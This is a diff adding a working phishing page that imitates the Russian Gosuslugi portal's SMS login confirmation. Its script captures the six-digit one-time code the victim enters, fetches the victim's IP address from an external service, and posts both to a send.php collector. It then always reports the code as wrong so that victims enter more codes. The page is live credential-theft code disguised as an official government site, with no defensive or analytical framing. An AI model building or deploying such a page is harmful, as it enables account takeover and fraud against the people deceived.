@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Госуслуги - Подтверждение</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #eef3fc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 380px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+            width: 160px;
+            height: 50px;
+            margin-left: auto;
+            margin-right: auto;
+            background-image: url('logo.4db68cf668f7092d.svg');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            pointer-events: none;
+            user-select: none;
+        }
+        .title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        .code-inputs input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 18px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .timer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        .resend {
+            font-weight: bold;
+            font-size: 16px;
+            color: black;
+        }
+        .cannot-confirm {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #0057ff;
+            cursor: pointer;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+    
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo"></div>
+        <div class="title">Подтвердите вход по СМС</div>
+        <div class="subtitle">Код подтверждения отправлен на ваш номер телефона</div>
+        <div class="code-inputs">
+            <input type="text" maxlength="1">
+            <input type="text" maxlength="1">
+            <input type="text" maxlength="1">
+            <input type="text" maxlength="1">
+            <input type="text" maxlength="1">
+            <input type="text" maxlength="1">
+        </div>
+        <div class="timer">Отправить повторно через <span class="resend">00:60</span></div>
+        <div class="error-message">Код введён неверно</div>
+        <div class="cannot-confirm">Не могу подтвердить вход</div>
+        <div class="subtitle">Если вам не поступает SMS-код, проверьте правильность указанных данных</div>
+    </div>
+
+<script>
+    function sendToServer(message, source) {
+        fetch("send.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ message, source })
+        });
+    }
+
+    function getUserIP(callback) {
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => callback(data.ip))
+            .catch(() => callback('Неизвестный IP'));
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+        let timerElement = document.querySelector(".resend");
+        let timeLeft = 60;
+
+        function updateTimer() {
+            if (timeLeft > 0) {
+                timerElement.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                timerElement.textContent = "Отправить код снова";
+                timerElement.style.color = "#0057ff";
+                timerElement.style.cursor = "pointer";
+            }
+        }
+
+        updateTimer();
+
+        let inputs = document.querySelectorAll(".code-inputs input");
+        let errorMessage = document.querySelector(".error-message");
+
+        inputs.forEach((input, index) => {
+            input.addEventListener("input", function () {
+                if (this.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+            input.addEventListener("keydown", function (e) {
+                if (e.key === "Backspace" && index > 0 && !this.value) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        document.querySelector(".code-inputs").addEventListener("keyup", function () {
+            let code = Array.from(inputs).map(input => input.value).join("");
+            if (code.length === 6) {
+                getUserIP(ip => {
+                    const message = `🔐 Попытка ввода кода: ${code}
+🌍 IP: ${ip}`;
+                    sendToServer(message, "code");
+                    errorMessage.style.display = "block";
+                    errorMessage.textContent = "Код введён неверно";
+                });
+            }
+        });
+
+        const cancel = document.querySelector(".cannot-confirm");
+        if (cancel) {
+            cancel.addEventListener("click", function () {
+                window.location.href = "loading.html";
+            });
+        }
+    });
+</script>
+
+</body>
+</html>
